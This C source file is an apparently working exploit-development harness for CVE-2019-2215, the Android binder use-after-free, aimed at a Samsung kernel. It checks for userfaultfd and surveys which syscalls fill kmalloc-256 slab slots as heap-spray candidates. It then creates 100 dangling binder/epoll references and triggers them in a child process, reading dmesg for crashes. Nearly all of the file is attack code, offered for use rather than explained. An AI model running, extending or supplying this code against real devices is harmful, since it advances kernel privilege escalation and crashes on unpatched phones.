/*
 * binder_mass_uaf.c — Mass UAF + natural reclaim approach
 *
 * UIO_FASTIOV=32 on this Samsung kernel blocks the standard iovec
 * spray. Instead, create MANY UAF instances and let natural system
 * allocations reclaim the freed kmalloc-256 slots. Then trigger
 * ep_unregister_pollwait on all dangling references.
 *
 * Also tests: socketpair + sendmsg as kmalloc-256 spray,
 * and checks if userfaultfd is available.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT     _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE       (128 * 1024)
#define NUM_UAF 100

#ifndef __NR_userfaultfd
#define __NR_userfaultfd 388
#endif

static int get_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512]; int val = -1;
    while (fgets(line, sizeof(line), f)) {
        char n[64]; int a;
        if (sscanf(line, "%63s %d", n, &a) == 2 && !strcmp(n, name)) {
            val = a; break;
        }
    }
    fclose(f);
    return val;
}

/* Test 1: Check if userfaultfd is available */
static void test_userfaultfd(void) {
    printf("=== Test: userfaultfd ===\n");
    int fd = syscall(__NR_userfaultfd, O_CLOEXEC);
    if (fd >= 0) {
        printf("  userfaultfd AVAILABLE! fd=%d\n", fd);
        close(fd);
    } else {
        printf("  userfaultfd NOT available: errno=%d (%s)\n",
               errno, strerror(errno));
    }
}

/* Test 2: socketpair sendmsg as kmalloc spray */
static void test_socket_spray(void) {
    printf("\n=== Test: socketpair + sendmsg spray ===\n");

    int before = get_slab("kmalloc-256");

    int sv[50][2];
    int count = 0;
    for (int i = 0; i < 50; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv[i]) < 0) {
            printf("  socketpair failed at %d: %s\n", i, strerror(errno));
            break;
        }

        /* Send a 200-byte message (should go to kmalloc-256 area of skb) */
        char data[200];
        memset(data, 'A', sizeof(data));
        struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
        struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1 };

        if (sendmsg(sv[i][0], &msg, 0) < 0) {
            printf("  sendmsg failed at %d: %s\n", i, strerror(errno));
            close(sv[i][0]); close(sv[i][1]);
            break;
        }
        count++;
    }

    int after = get_slab("kmalloc-256");
    printf("  Sent %d messages\n", count);
    printf("  kmalloc-256: %d → %d (%+d)\n", before, after, after - before);

    /* Also check other caches */
    char *caches[] = {"kmalloc-64","kmalloc-128","kmalloc-192",
                      "kmalloc-512","kmalloc-1024",NULL};
    int bvals[5], avals[5];
    /* Actually let's just check after */
    for (int c = 0; caches[c]; c++) {
        int v = get_slab(caches[c]);
        printf("  %s: %d\n", caches[c], v);
    }

    /* Cleanup */
    for (int i = 0; i < count; i++) {
        close(sv[i][0]); close(sv[i][1]);
    }
}

/* Test 3: What allocates in kmalloc-256? Broad survey */
static void test_k256_survey(void) {
    printf("\n=== Test: kmalloc-256 spray survey ===\n");

    /* Test A: socketpair + setsockopt */
    {
        int before = get_slab("kmalloc-256");
        int socks[50][2];
        for (int i = 0; i < 50; i++) {
            socketpair(AF_UNIX, SOCK_STREAM, 0, socks[i]);
        }
        int after = get_slab("kmalloc-256");
        printf("  50 socketpairs (AF_UNIX, STREAM): kmalloc-256 %+d\n", after - before);
        for (int i = 0; i < 50; i++) { close(socks[i][0]); close(socks[i][1]); }
    }

    /* Test B: signalfd */
    {
        int before = get_slab("kmalloc-256");
        int fds[50];
        for (int i = 0; i < 50; i++) {
            sigset_t mask;
            sigemptyset(&mask);
            sigaddset(&mask, SIGUSR1);
            fds[i] = syscall(__NR_signalfd4, -1, &mask, 8, 0);
        }
        int after = get_slab("kmalloc-256");
        printf("  50 signalfd: kmalloc-256 %+d\n", after - before);
        for (int i = 0; i < 50; i++) if (fds[i] >= 0) close(fds[i]);
    }

    /* Test C: eventfd */
    {
        int before = get_slab("kmalloc-256");
        int fds[50];
        for (int i = 0; i < 50; i++) {
            fds[i] = syscall(__NR_eventfd2, 0, 0);
        }
        int after = get_slab("kmalloc-256");
        printf("  50 eventfd: kmalloc-256 %+d\n", after - before);
        for (int i = 0; i < 50; i++) if (fds[i] >= 0) close(fds[i]);
    }

    /* Test D: timerfd */
    {
        int before = get_slab("kmalloc-256");
        int fds[50];
        for (int i = 0; i < 50; i++) {
            fds[i] = syscall(__NR_timerfd_create, 1 /*CLOCK_MONOTONIC*/, 0);
        }
        int after = get_slab("kmalloc-256");
        printf("  50 timerfd: kmalloc-256 %+d\n", after - before);
        for (int i = 0; i < 50; i++) if (fds[i] >= 0) close(fds[i]);
    }

    /* Test E: /dev/ashmem open */
    {
        int before = get_slab("kmalloc-256");
        int fds[50];
        for (int i = 0; i < 50; i++) {
            fds[i] = open("/dev/ashmem", O_RDWR);
        }
        int after = get_slab("kmalloc-256");
        printf("  50 ashmem open: kmalloc-256 %+d\n", after - before);
        for (int i = 0; i < 50; i++) if (fds[i] >= 0) close(fds[i]);
    }

    /* Test F: open /proc/self/stat (seq_file) */
    {
        int before = get_slab("kmalloc-256");
        int fds[50];
        for (int i = 0; i < 50; i++) {
            fds[i] = open("/proc/self/stat", O_RDONLY);
        }
        int after = get_slab("kmalloc-256");
        printf("  50 /proc/self/stat: kmalloc-256 %+d\n", after - before);
        for (int i = 0; i < 50; i++) if (fds[i] >= 0) close(fds[i]);
    }

    /* Test G: dup2 + fcntl */
    {
        int before = get_slab("kmalloc-256");
        int src = open("/dev/null", O_RDONLY);
        int fds[50];
        for (int i = 0; i < 50; i++) {
            fds[i] = dup(src);
        }
        int after = get_slab("kmalloc-256");
        printf("  50 dup: kmalloc-256 %+d\n", after - before);
        for (int i = 0; i < 50; i++) if (fds[i] >= 0) close(fds[i]);
        close(src);
    }

    /* Test H: mmap anonymous */
    {
        int before = get_slab("kmalloc-256");
        void *maps[50];
        for (int i = 0; i < 50; i++) {
            maps[i] = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
                          MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        }
        int after = get_slab("kmalloc-256");
        printf("  50 mmap anon: kmalloc-256 %+d\n", after - before);
        for (int i = 0; i < 50; i++) munmap(maps[i], 4096);
    }

    /* Test I: inotify */
    {
        int before = get_slab("kmalloc-256");
        int fds[50];
        for (int i = 0; i < 50; i++) {
            fds[i] = syscall(__NR_inotify_init1, 0);
        }
        int after = get_slab("kmalloc-256");
        printf("  50 inotify: kmalloc-256 %+d\n", after - before);
        for (int i = 0; i < 50; i++) if (fds[i] >= 0) close(fds[i]);
    }
}

/* Test 4: Mass UAF + delayed trigger */
static void test_mass_uaf(void) {
    printf("\n=== Test: Mass UAF (%d instances) ===\n", NUM_UAF);

    int bfds[NUM_UAF], epfds[NUM_UAF];
    int created = 0;

    int before = get_slab("kmalloc-256");

    for (int i = 0; i < NUM_UAF; i++) {
        bfds[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfds[i] < 0) {
            printf("  Failed to open binder at %d\n", i);
            break;
        }
        mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfds[i], 0);
        uint32_t z = 0;
        ioctl(bfds[i], BINDER_SET_MAX_THREADS, &z);
        epfds[i] = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfds[i], EPOLL_CTL_ADD, bfds[i], &ev);
        /* Free the thread — creates dangling epoll reference */
        int32_t d = 0;
        ioctl(bfds[i], BINDER_THREAD_EXIT, &d);
        created++;
    }

    int after_free = get_slab("kmalloc-256");
    printf("  Created %d UAF instances\n", created);
    printf("  kmalloc-256: %d → %d (after free: %+d)\n",
           before, after_free, after_free - before);

    /* Wait for natural reclaim (system activity) */
    printf("  Waiting 3 seconds for natural slab recycling...\n");
    sleep(3);

    int after_wait = get_slab("kmalloc-256");
    printf("  kmalloc-256 after wait: %d (%+d from free)\n",
           after_wait, after_wait - after_free);

    /* Now trigger all epoll_ctl DELs in a forked child (crash-safe) */
    printf("  Triggering %d epoll_ctl DELs in child...\n", created);
    fflush(stdout);

    pid_t pid = fork();
    if (pid == 0) {
        alarm(10);
        for (int i = 0; i < created; i++) {
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfds[i], EPOLL_CTL_DEL, bfds[i], &ev);
        }
        printf("  [child] All DELs completed, no crash\n");
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) {
        printf("  *** CHILD CRASHED with signal %d! ***\n", WTERMSIG(status));
        printf("  *** UAF + natural reclaim caused crash! ***\n");
    } else {
        printf("  Child exited normally (status=%d)\n", WEXITSTATUS(status));
    }

    /* Cleanup */
    for (int i = 0; i < created; i++) {
        close(bfds[i]);
        close(epfds[i]);
    }

    /* Check dmesg */
    printf("  dmesg:\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -10 | grep -iE 'oops|bug|panic|fault|binder|list|corrupt|poison|Backtrace|Unable' 2>/dev/null");
}

int main(void) {
    printf("=== CVE-2019-2215 Mass UAF + Spray Survey ===\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    test_userfaultfd();
    test_socket_spray();
    test_k256_survey();
    test_mass_uaf();

    printf("\n=== Done ===\n");
    return 0;
}
